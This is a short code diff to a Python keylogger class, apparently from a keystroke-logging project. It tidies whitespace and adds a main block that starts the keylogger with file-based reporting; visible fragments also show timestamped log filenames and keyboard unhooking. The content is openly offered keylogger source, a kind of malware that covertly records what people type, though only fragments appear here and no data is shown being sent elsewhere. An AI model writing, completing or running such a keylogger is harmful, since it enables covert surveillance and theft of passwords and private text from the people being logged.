@@ -9,7 +9,7 @@ class Keylogger:
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
         self.filename = ""
-        self.running = True  
+        self.running = True
         
     def update_filename(self):
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
@@ -48,3 +48,7 @@ class Keylogger:
             else:
                 pass
             keyboard.unhook_all()
+
+if __name__ == "__main__":
+    keylogger = Keylogger(report_method="file")
+    keylogger.start()
